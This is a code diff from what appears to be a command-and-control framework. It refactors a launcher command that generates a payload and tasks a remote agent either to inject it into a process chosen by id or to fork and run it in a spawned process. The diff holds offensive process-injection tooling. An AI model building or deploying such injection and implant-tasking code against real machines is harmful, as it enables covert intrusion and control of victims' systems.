@@ -11,6 +11,7 @@ using Commander.Models;
 using Commander.Commands.Agent;
 using Common;
 using Common.Payload;
+using Shared;
 
 namespace Commander.Commands.Laucher
 {
@@ -22,8 +23,6 @@ namespace Commander.Commands.Laucher
         public bool x86 { get; set; }
 
         public bool verbose { get; set; }
-
-        public string processName { get; set; }
 
         public int? processId { get; set; }
 
@@ -40,7 +39,6 @@ namespace Commander.Commands.Laucher
         public override RootCommand Command => new RootCommand(this.Description)
         {
             new Option<int?>(new[] { "--processId", "-pid" }, () => null, "id of the process to injects to"),
-            new Option<string>(new[] { "--processName", "-p" }, () => null, "name of process to spawn"),
             new Option<string>(new[] { "--endpoint", "-b" }, () => null, "EndPoint to Bind To"),
             new Option<string>(new[] { "--serverKey", "-k" }, () => null, "The server unique key of the endpoint"),
             new Option(new[] { "--x86", "-x86" }, "Generate a x86 architecture executable"),
@@ -85,22 +83,20 @@ namespace Commander.Commands.Laucher
             else
                 context.Terminal.WriteSuccess($"[+] Generation succeed!");
 
-            context.Terminal.WriteLine($"Preparing to upload the file...");
+            context.AddParameter(ParameterId.File, pay);
 
-            var fileName = ShortGuid.NewGuid() + ".bin";
-
-            var fileId = await context.UploadAndDisplay(pay, fileName);
-
-            var processPath = context.Options.processName;
-            if (string.IsNullOrEmpty(processPath))
-                processPath = context.Options.x86 ? context.Config.SpawnConfig.SpawnToX86 : context.Config.SpawnConfig.SpawnToX64;
 
             if (context.Options.processId.HasValue)
-                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-remote", fileId, fileName, $"{context.Options.processId.Value}");
+            {
+                context.AddParameter(ParameterId.Id, context.Options.processId.Value);
+                await context.CommModule.TaskAgent(context.CommandLabel, agent.Id, Shared.CommandId.Inject, context.Parameters);
+            }
             else
-                await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "inject-spawn", fileId, fileName, $"{processPath}");
+            {
+                await context.CommModule.TaskAgent(context.CommandLabel, agent.Id, Shared.CommandId.ForkAndRun, context.Parameters);
+            }
 
-            context.Terminal.WriteInfo($"File uploaded to the server, agent tasked to download the file and migrate.");
+            context.WriteTaskSendToAgent(this);
 
             return true;
         }
